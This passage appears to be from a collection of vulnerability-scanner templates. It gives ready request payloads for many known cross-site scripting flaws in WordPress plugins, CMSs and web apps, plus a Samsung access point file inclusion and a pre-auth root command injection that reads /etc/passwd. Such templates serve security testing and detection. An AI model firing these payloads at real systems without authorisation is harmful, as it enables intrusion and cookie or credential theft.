**Type - word**
- part - body
- words
    1. \</script>\<img src onerror=alert(document.domain)>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Related Posts \<= 2.1.1 - Cross Site Scripting
## Description
- WordPress Related Posts plugin before 2.1.1 contains an Reflected XSS via rp4wp_parent

- severity - medium
- tags - wordpress,wp,wp-plugin,xss,relatedposts,authenticated
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```
### Step - 2
```
GET /wp-admin/admin.php?page=rp4wp_link_related&rp4wp_parent=156x%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<img src=x onerror=alert(document.domain)>&action=edit
    2. All Posts\</a>
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Securimage-WP 3.2.4 - Cross-Site Scripting
## Description
- WordPress Securimage-WP 3.2.4 plugin contains a cross-site scripting vulnerability via siwp_test.php. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - edb,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/securimage-wp/siwp_test.php/%22/%3E%3Cscript%3Ealert(1);%3C/script%3E?tested=1
### Matchers

**Type - word**
- words
    1. \<script>alert(1)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Custom Tables 3.4.4 - Cross-Site Scripting
## Description
- WordPress Custom Tables 3.4.4 plugin contains a cross-site scripting vulnerability via the key parameter.
- severity - high
- tags - wpscan,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/custom-tables/iframe.php?s=1&key=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress WooCommerce PDF Invoices & Packing Slips \<2.15.0 - Cross-Site Scripting
## Description
- WordPress WooCommerce PDF Invoices & Packing Slips 2.15.0 does not escape some URLs before outputting them in attributes, leading to reflected cross-site scripting.
- severity - medium
- tags - xss,wp,wordpress,woocommerce,authenticated,wpscan,wp-plugin
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=wpo_wcpdf_options_page&tab=documents&section=invoice&"><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. >\<script>alert(document.domain)\</script>
    2. WooCommerce PDF Invoices
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Knews Multilingual Newsletters 1.1.0 - Cross-Site Scripting
## Description
- WordPress Knews Multilingual Newsletters 1.1.0 plugin contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/knews/wysiwyg/fontpicker/?ff=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Samsung WLAN AP WEA453e - Local File Inclusion
## Description
- Samsung WLAN AP WEA453e is susceptible to local file inclusion vulnerabilities.
- severity - high
- tags - xss,samsung,lfi
## Requests
- Method - GET
### URL
- {{BaseURL}}/(download)/etc/passwd
### Matchers

**Type - regex**
- regex
    1. root:.*:0:0:
    2. bin:.*:1:1
- part - body

**Type - status**
- status
    1. 200

---
# Samsung WLAN AP WEA453e - Cross-Site Scripting
## Description
- Samsung WLAN AP WEA453e router contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - xss,samsung
## Requests
- Method - GET
### URL
- {{BaseURL}}/%3Cscript%3Ealert(document.domain)%3C/script%3E
### Matchers

**Type - word**
- words
    1. /tmp/www/\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 404

**Type - word**
- words
    1. text/html
- part - header

---
# Samsung WLAN AP WEA453e - Remote Code Execution
## Description
- Samsung WLAN AP WEA453e is vulnerable to a pre-auth root remote command execution vulnerability, which means an attacker could run code as root remotely without logging in.
- severity - critical
- tags - xss,samsung,rce
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/(download)/tmp/poc.txt
  - command1=shell%3Acat /etc/passwd|dd of=/tmp/poc.txt
### Matchers

**Type - regex**
- regex
    1. root:.*:0:0:
    2. bin:.*:1:1
- part - body

**Type - status**
- status
    1. 200

---
# DedeCMS 5.7 - Cross-Site Scripting
## Description
- DeDeCMS 5.7 contains a cross-site scripting vulnerability in the '/include/dialog/config.php' file. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site.

- severity - high
- tags - dedecms,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/include/dialog/config.php?adminDirHand=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. location='../../\</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Gnuboard 5 - Cross-Site Scripting
## Description
- Gnuboard 5 contains a cross-site scripting vulnerability via the $_GET['LGD_OID'] parameter.

- severity - medium
- tags - gnuboard,xss,huntr
## Requests
- Method - GET
### URL
- {{BaseURL}}/mobile/shop/lg/mispwapurl.php?LGD_OID=%3Cscript%3Ealert(document.domain)%3C/script%3E
### Matchers

**Type - word**
- words
    1. LGD_OID = \<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Gnuboard 5 - Cross-Site Scripting
## Description
- Gnuboard 5 contains a cross-site scripting vulnerability via the clean_xss_tags() function called in new.php.

- severity - medium
- tags - xss,gnuboard,gnuboard5,huntr
## Requests
- Method - GET
### URL
- {{BaseURL}}/bbs/new.php?darkmode=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
### Matchers

**Type - word**
- words
    1. header\">\<script>alert(document.domain)\</script>.css?

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Gnuboard CMS - Cross-Site Scripting
## Description
- Gnuboard CMS contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary JavaScript into the responses returned by the server.
- severity - medium
- tags - xss,gnuboard
## Requests
- Method - GET
### URL
- {{BaseURL}}/plugin/sms5/ajax.sms_emoticon.php?arr_ajax_msg=gnuboard\<svg+onload=alert(document.domain)>
### Matchers

**Type - word**
- part - body
- words
    1. "0nuboard\<svg onload=alert(document.domain)>"

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# IBM Eclipse Help System - Cross-Site Scripting
## Description
- IBM Eclipse Help System 6.1.0 through 6.1.0.6, 6.1.5 through 6.1.5.3, 7.0 through 7.0.0.2, and 8.0 prior to 8.0.0.1 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site.
- severity - high
- tags - ibm,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \<script>alert(document.cookie)\</script>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# Top 38 Parameters - Cross-Site Scripting
## Description
- Cross-site scripting was discovered via a search for reflected parameter values in the server response via GET-requests.
- severity - high
- tags - xss,generic
## Requests
- Method - GET
### URL
- {{BaseURL}}/?q=%27%3E%22%3Csvg%2Fonload=confirm%28%27q%27%29%3E&s=%27%3E%22%3Csvg%2Fonload=confirm%28%27s%27%29%3E&search=%27%3E%22%3Csvg%2Fonload=confirm%28%27search%27%29%3E&id=%27%3E%22%3Csvg%2Fonload=confirm%28%27id%27%29%3E&action=%27%3E%22%3Csvg%2Fonload=confirm%28%27action%27%29%3E&keyword=%27%3E%22%3Csvg%2Fonload=confirm%28%27keyword%27%29%3E&query=%27%3E%22%3Csvg%2Fonload=confirm%28%27query%27%29%3E&page=%27%3E%22%3Csvg%2Fonload=confirm%28%27page%27%29%3E&keywords=%27%3E%22%3Csvg%2Fonload=confirm%28%27keywords%27%29%3E&url=%27%3E%22%3Csvg%2Fonload=confirm%28%27url%27%29%3E&view=%27%3E%22%3Csvg%2Fonload=confirm%28%27view%27%29%3E&cat=%27%3E%22%3Csvg%2Fonload=confirm%28%27cat%27%29%3E&name=%27%3E%22%3Csvg%2Fonload=confirm%28%27name%27%29%3E&key=%27%3E%22%3Csvg%2Fonload=confirm%28%27key%27%29%3E&p=%27%3E%22%3Csvg%2Fonload=confirm%28%27p%27%29%3E
- {{BaseURL}}/?api=%27%3E%22%3Csvg%2Fonload=confirm%28%27api%27%29%3E&api_key=%27%3E%22%3Csvg%2Fonload=confirm%28%27api_key%27%29%3E&begindate=%27%3E%22%3Csvg%2Fonload=confirm%28%27begindate%27%29%3E&callback=%27%3E%22%3Csvg%2Fonload=confirm%28%27callback%27%29%3E&categoryid=%27%3E%22%3Csvg%2Fonload=confirm%28%27categoryid%27%29%3E&csrf_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27csrf_token%27%29%3E&email=%27%3E%22%3Csvg%2Fonload=confirm%28%27email%27%29%3E&emailto=%27%3E%22%3Csvg%2Fonload=confirm%28%27emailto%27%29%3E&enddate=%27%3E%22%3Csvg%2Fonload=confirm%28%27enddate%27%29%3E&immagine=%27%3E%22%3Csvg%2Fonload=confirm%28%27immagine%27%29%3E&item=%27%3E%22%3Csvg%2Fonload=confirm%28%27item%27%29%3E&jsonp=%27%3E%22%3Csvg%2Fonload=confirm%28%27jsonp%27%29%3E&l=%27%3E%22%3Csvg%2Fonload=confirm%28%27l%27%29%3E&lang=%27%3E%22%3Csvg%2Fonload=confirm%28%27lang%27%29%3E&list_type=%27%3E%22%3Csvg%2Fonload=confirm%28%27list_type%27%29%3E
- {{BaseURL}}/?month=%27%3E%22%3Csvg%2Fonload=confirm%28%27month%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27page_id%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27password%27%29%3E&terms=%27%3E%22%3Csvg%2Fonload=confirm%28%27terms%27%29%3E&token=%27%3E%22%3Csvg%2Fonload=confirm%28%27token%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27type%27%29%3E&unsubscribe_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27unsubscribe_token%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27year%27%29%3E
### Matchers

**Type - word**
- part - body
- condition - or
- words
    1. '>"\<svg/onload=confirm('q')>
    2. '>"\<svg/onload=confirm('s')>
    3. '>"\<svg/onload=confirm('search')>
    4. '>"\<svg/onload=confirm('id')>
    5. '>"\<svg/onload=confirm('action')>
    6. '>"\<svg/onload=confirm('keyword')>
    7. '>"\<svg/onload=confirm('query')>
    8. '>"\<svg/onload=confirm('page')>
    9. '>"\<svg/onload=confirm('keywords')>
    10. '>"\<svg/onload=confirm('url')>
    11. '>"\<svg/onload=confirm('view')>
    12. '>"\<svg/onload=confirm('cat')>
    13. '>"\<svg/onload=confirm('name')>
    14. '>"\<svg/onload=confirm('key')>
    15. '>"\<svg/onload=confirm('p')>
    16. '>"\<svg/onload=confirm('month')>
    17. '>"\<svg/onload=confirm('page_id')>
    18. '>"\<svg/onload=confirm('password')>
    19. '>"\<svg/onload=confirm('terms')>
    20. '>"\<svg/onload=confirm('token')>
    21. '>"\<svg/onload=confirm('type')>
    22. '>"\<svg/onload=confirm('unsubscribe_token')>
    23. '>"\<svg/onload=confirm('api')>
    24. '>"\<svg/onload=confirm('api_key')>
    25. '>"\<svg/onload=confirm('begindate')>
    26. '>"\<svg/onload=confirm('callback')>
    27. '>"\<svg/onload=confirm('categoryid')>
    28. '>"\<svg/onload=confirm('csrf_token')>
    29. '>"\<svg/onload=confirm('email')>
    30. '>"\<svg/onload=confirm('emailto')>
    31. '>"\<svg/onload=confirm('enddate')>
    32. '>"\<svg/onload=confirm('immagine')>
    33. '>"\<svg/onload=confirm('item')>
    34. '>"\<svg/onload=confirm('jsonp')>
    35. '>"\<svg/onload=confirm('l')>
    36. '>"\<svg/onload=confirm('lang')>
    37. '>"\<svg/onload=confirm('list_type')>
    38. '>"\<svg/onload=confirm('year')>

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- part - body
- condition - or
- negative - True
- words
    1. \<title>Access Denied\</title>
    2. You don't have permission to access

**Type - status**
- status
    1. 200

---
# Basic XSS Prober - Cross-Site Scripting
## Description
- A cross-site scripting vulnerability was discovered via generic testing. Manual testing is needed to verify exploitation.
- severity - low
- tags - xss,generic
## Requests
- Method - GET
### URL
- {{BaseURL}}/%61%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e
### Matchers

**Type - word**
- words
    1. ">\<injectable>
- part - body

**Type - word**
- words
    1. text/html
- part - header

**Type - status**
- status
    1. 200

---
# Drupal Avatar Uploader - Cross-Site Scripting
## Description
- Drupal Avatar Uploader v7.x-1.0-beta8 plugin contains a cross-site scripting vulnerability in the slider import search feature and tab parameter via plugin settings.

- severity - high
- tags - xss,drupal,edb,packetstorm
## Requests
- Method - GET
### URL
- {{BaseURL}}/avatar_uploader.pages.inc?file=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \<div>\<script>alert(document.domain)\</script>\</div>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Netsweeper 4.0.9 - Cross-Site Scripting
## Description
- Netsweeper 4.0.9 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - edb,xss,packetstorm,netsweeper
## Requests
- Method - GET
### URL
- {{BaseURL}}/webadmin/reporter/view_server_log.php?server=localhost&act=stats&filename=&offset=1&count=1000&sortorder=&log=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&offset=&sortitem=&filter=
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Royal Event Management System - Cross-Site Scripting
## Description
- Royal Event Management System contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - high
- tags - cms,royalevent,packetstorm,xss,authenticated
## Requests
### Step - 1
```
POST /royal_event/ HTTP/1.1
Host: {{Hostname}}
Content-Length: 353
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCSxQll1eihcqgIgD

------WebKitFormBoundaryCSxQll1eihcqgIgD
Content-Disposition: form-data; name="username"

{{username}}
------WebKitFormBoundaryCSxQll1eihcqgIgD
Content-Disposition: form-data; name="password"

{{password}}
------WebKitFormBoundaryCSxQll1eihcqgIgD
Content-Disposition: form-data; name="login"

------WebKitFormBoundaryCSxQll1eihcqgIgD--

```
### Step - 2
```
POST /royal_event/btndates_report.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFboH5ITu7DsGIGrD

------WebKitFormBoundaryFboH5ITu7DsGIGrD
Content-Disposition: form-data; name="todate"

2022-12-22<script>alert(document.domain)</script>
------WebKitFormBoundaryFboH5ITu7DsGIGrD
Content-Disposition: form-data; name="search"

3
------WebKitFormBoundaryFboH5ITu7DsGIGrD
Content-Disposition: form-data; name="fromdate"

2022-06-22<script>alert(document.domain)</script>
------WebKitFormBoundaryFboH5ITu7DsGIGrD--

```
### Matchers

**Type - word**
- words
    1. \<script>alert(document.domain)\</script>
    2. Report from 
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Royal Event Management System - Stored Cross-Site Scripting
## Description
- Royal Event Management System contains a stored cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - high
- tags - xss,unauthenticated,cms,royalevent,packetstorm
## Requests
### Step - 1
```
POST /royal_event/companyprofile.php HTTP/1.1
Host: {{Hostname}}

companyname=%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&regno=test&companyaddress=&companyemail=&country=India&mobilenumber=1234567899&submit=

```
### Matchers

**Type - word**
- words
    1. value=">\<script>alert(document.domain)\</script>" >

**Type - status**
- status
    1. 302

---
# Ruby on Rails - CRLF Injection and Cross-Site Scripting
## Description
- Ruby on Rails 6.0.0-6.0.3.1 contains a CRLF issue which allows JavaScript to be injected into the response, resulting in cross-site scripting.
- severity - medium
- tags - rails,xss,crlf,hackerone
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa
### Matchers

**Type - word**
- words
    1. javascript:alert(1)
- part - body

**Type - status**
- status
    1. 302

**Type - word**
- words
    1. Location: aaaaa
    2. text/html
- part - header
- condition - and

---
# SquirrelMail Virtual Keyboard \<=0.9.1 - Cross-Site Scripting
## Description
- SquirrelMail Virtual Keyboard plugin 0.9.1 and prior contains a cross-site scripting vulnerability via the vkeyboard.php parameter. It fails to properly sanitize user-supplied input, which allows an attacker to execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - xss,squirrelmail,plugin,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/plugins/vkeyboard/vkeyboard.php?passformname=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# SquirrelMail Address Add 1.4.2 - Cross-Site Scripting
## Description
- SquirrelMail Address Add 1.4.2 plugin contains a cross-site scripting vulnerability. It fails to properly sanitize user-supplied input, thus allowing an attacker to execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - edb,xss,squirrelmail,plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/plugins/address_add/add.php?first=HOVER%20ME!%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

---
# Blackboard - Cross-Site Scripting
## Description
- Blackboard contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - blackboard,parentlink,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/main/blank?message_success=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
- {{BaseURL}}/main/blank?message_error=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E
### Matchers

**Type - word**
- words
    1. \<img src=c onerror=alert(8675309)>
- part - body

**Type - word**
- words
    1. text/html
- part - header

**Type - status**
- status
    1. 200

---
# WEMS Enterprise Manager - Cross-Site Scripting
## Description
- WEMS Enterprise Manager contains a cross-site scripting vulnerability via the /guest/users/forgotten endpoint and the email parameter, which allows a remote attacker to inject arbitrary JavaScript into the response return by the server.
- severity - high
- tags - xss,packetstorm
## Requests
- Method - GET
### URL
- {{BaseURL}}/guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. ">\<script>confirm(document.domain)\</script>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# Adobe ColdFusion - Cross-Site Scripting
## Description
- Adobe ColdFusion debug page contains a cross-site scripting vulnerability when the application is running on a remote host. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - adobe,coldfusion,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
- {{BaseURL}}/cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
### Matchers

**Type - word**
- part - body
- words
    1. "cf_main_cf" src="javascript:alert(1)"

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Thruk Monitoring Webinterface - Cross-Site Scripting
## Description
- Thruk Monitoring Webinterface contains a cross-site scripting vulnerability via the login parameter at /thruk/cgi-bin/login.cgi.

- severity - high
- tags - thruk,xss
## Requests
### Step - 1
```
POST /thruk/cgi-bin/login.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

referer=&login=%22%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%22%40gmail.com&password=test&submit=Login

```
### Matchers

**Type - word**
- words
    1. \<svg/onload=alert(document.domain)>"@gmail.com') called at

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 500

---
# Qcubed - Cross-Site Scripting
## Description
- Qcubed contains a cross-site scripting vulnerability which allows a remote attacker to inject arbitrary JavaScript via the /assets/php/_devtools/installer/step_2.php endpoint and the installation_path parameter.
- severity - high
- tags - xss,qcubed
## Requests
- Method - GET
### URL
- {{BaseURL}}/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
- {{BaseURL}}/qcubed/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# RockMongo 1.1.8 - Cross-Site Scripting
## Description
- RockMongo 1.1.8 contains a cross-site scripting vulnerability which allows attackers to inject arbitrary JavaScript into the response returned by the application.
- severity - high
- tags - rockmongo,xss,packetstorm
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/index.php?action=login.index
  - more=0&host=0&username=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&password=&db=&lang=en_us&expire=3
### Matchers

**Type - word**
- words
    1. ">\<script>alert(document.domain)\</script>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. Content-Type: text/html
- part - header

---
# Let's Encrypt - Cross-Site Scripting
## Description
- Let's Encrypt contains a cross-site scripting vulnerability when using the the ACME protocol to issue SSL certificates.
- severity - high
- tags - xss,acme
## Requests
- Method - GET
### URL
- {{BaseURL}}/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E
### Matchers

**Type - word**
- words
    1. \<?xml version="1.0"?>\<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)\</x:script>

**Type - word**
- words
    1. /xml
    2. /html

---
# Hospital Management System 1.0 - Cross-Site Scripting
## Description
- Hospital Management System 1.0 contains a cross-site scripting vulnerability via the searchdata parameter in doctor/search.php.

- severity - high
- tags - hms,hospital,cms,xss,authenticated
## Requests
### Step - 1
```
POST /hms/doctor/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}password={{password}}&submit=

```
### Step - 2
```
POST /hms/doctor/search.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

searchdata=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&search=

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_2, "text/html")
    2. status_code_2 == 200
    3. contains(body_2, 'Result against \"\<script>alert(document.domain)\</script>\" keyword')
- condition - and

---
# Reddit Top RSS - Cross-Site Scripting
## Description
- Reddit Top RSS contains a cross-site scripting vulnerability via the /?subreddit=news&score= parameter.

- severity - high
- tags - reddit,rss,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/?subreddit=news&score=2134%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. value="2134">\<script>alert(document.domain)\</script>" min="0"

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Complete Online Job Search System 1.0 - Cross-Site Scripting
## Description
- Complete Online Job Search System 1.0 contains a cross-site scripting vulnerability via index.php?q=advancesearch.

- severity - high
- tags - cve,cve2022,xss,eris
## Requests
### Step - 1
```
POST /index.php?q=result&searchfor=advancesearch HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

SEARCH=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&COMPANY=&CATEGORY=&submit=Submit

```
### Matchers

**Type - word**
- part - body
- words
    1. Result : \<script>alert(document.domain)\</script>
    2. ERIS
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Tiki Wiki CMS Groupware 5.2 - Cross-Site Scripting
## Description
- Tiki Wiki CMS Groupware 5.2 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - packetstorm,edb,xss,tikiwiki
## Requests
- Method - GET
### URL
- {{BaseURL}}/tiki-5.2/tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(31337)%3C/script%3E
- {{BaseURL}}/tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(31337)%3C/script%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \<script>alert(31337)\</script>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# Car Rental Management System 1.0 - Cross-Site Scripting
## Description
- Car Rental Management System 1.0 contains a cross-site scripting vulnerability via admin/ajax.php?action=save_category in Name and Description parameter.

- severity - medium
- tags - xss,cms,authenticated,edb
## Requests
### Step - 1
```
POST /admin/ajax.php?action=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

```
### Step - 2
```
POST /admin/ajax.php?action=save_category HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCMJ5bh3B6m9767Em

------WebKitFormBoundaryCMJ5bh3B6m9767Em
Content-Disposition: form-data; name="id"

------WebKitFormBoundaryCMJ5bh3B6m9767Em
Content-Disposition: form-data; name="name"

</script><script>alert(document.domain)</script>
------WebKitFormBoundaryCMJ5bh3B6m9767Em
Content-Disposition: form-data; name="description"

<script>alert(document.domain)</script>
------WebKitFormBoundaryCMJ5bh3B6m9767Em--

```
### Step - 3
```
GET /admin/index.php?page=categories HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<p>Name: \<b>\</script>\<script>alert(document.domain)\</script>\</b>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# SolarView Compact 6.00 - Cross-Site Scripting
## Description
- SolarView Compact 6.00 contains a cross-site scripting vulnerability via fname at /Solar_Image.php.

- severity - high
- tags - xss,solarview,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/Solar_Image.php?mode=resize&fname=test%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. value="test">\<script>alert(document.domain)\</script>">

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Avada Website Builder \<7.4.2 - Cross-Site Scripting
## Description
- WordPress Avada Website Builder prior to 7.4.2 contains a cross-site scripting vulnerability. The theme does not properly escape bbPress searches before outputting them back as breadcrumbs.
- severity - high
- tags - xss,wp,wordpress,wp-theme,avada,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/forums/search/z-->%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/
### Matchers

**Type - word**
- part - body
- words
    1. ">\</script>\<script>alert(document.domain)\</script>
    2. avada-footer-scripts
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Discourse - Cross-Site Scripting
## Description
- Discourse contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - xss,discourse
## Requests
- Method - GET
### URL
- {{BaseURL}}/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
### Matchers

